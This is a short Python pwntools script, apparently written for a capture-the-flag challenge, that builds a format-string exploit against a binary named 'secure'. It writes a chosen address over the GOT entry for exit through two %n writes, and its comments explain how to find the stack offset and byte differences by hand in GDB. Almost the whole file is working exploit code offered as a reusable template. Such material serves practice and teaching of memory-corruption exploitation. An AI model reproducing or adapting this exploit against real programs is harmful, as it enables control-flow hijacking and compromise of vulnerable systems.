#!/usr/bin/env python

'''
FULL DISCLAIMER:
  This aims to be a general purpose script... but you will need to modify it
  as you work with exploring the problem you are on. There are a couple steps of 
  manual testing, and I try to explain these in the comments below.
'''


from pwn import *

context.log_level = 'critical'

elf = ELF('./secure')

# These are the addresses in memory that you want to overwrite. YOU WILL NEED TO CHANGE THESE
overwite = elf.got['exit'] # this is the value that you want to OVERWRITE...
to_write = 0x08048713 # this is the value that you want TO OVERWRITE IT WITH...


# For initial testing, you will first need to discover MANUALLY..:
### This is the offset of our buffer on the stack. (the position of AAAA for testing)
offset = 35

### These values come from testing in GDB.... YOU WILL NEED TO DO THIS MANUALLY
testing_value = 30  # use this when replacing

first_difference = 16 # this is the value you see replacing the GOT entry after you test it
                      # (the hex value you see overwriting GOT subtracted from your test value)
second_difference = 0x8731 # this is the value you see the SECOND time you test high


# --------------------------------------------------------------------------------------------

# These variables help do the math for you. DO NOT CHANGE THESE VARIABLES
LOW_BYTES = str(hex(to_write)[-4:])
LOW_BYTES_DIFFERENCE = int(LOW_BYTES,16) - first_difference
HIGH_BYTES = '1'+hex(to_write)[2:-4].zfill(4)
HIGH_BYTES_DIFFERENCE = int(HIGH_BYTES, 16) - second_difference + testing_value


def pad(s): return s + "X" * ( 64 - len(s) )

exploit = ""
exploit += p32(elf.got['exit'])      # this will be filled with the LOW BYTES DIFFERENCE...
exploit += p32(elf.got['exit'] + 2)  # this will be filled with the HIGH BYTES...
exploit += 'AAAABBBB'

exploit += '%'+str(offset)+'$'+str(testing_value)+'x' ## USED FOR FIRST TEST... 
                                                      ## (COMMENT OUT THE 2ND TEST BELOW!!)
# exploit += '%'+str(offset)+'$'+str(LOW_BYTES_DIFFERENCE)+'x' # used for padding...
exploit += '%'+str(offset)+'$n' # used to write the value!

exploit += '%'+str(offset+1)+'$'+str(testing_value)+'x' ## USED FOR SECOND TEST... 
                                                        ## (KEEP THE FIRST TEST ABOVE)
#exploit += '%'+str(offset+1)+'$'+str(HIGH_BYTES_DIFFERENCE)+'x'
exploit += '%'+str(offset+1)+'$n' # used to write the value!


print exploit

# open('payload','w').write("\n".join(['password', pad(exploit), 'password','']))

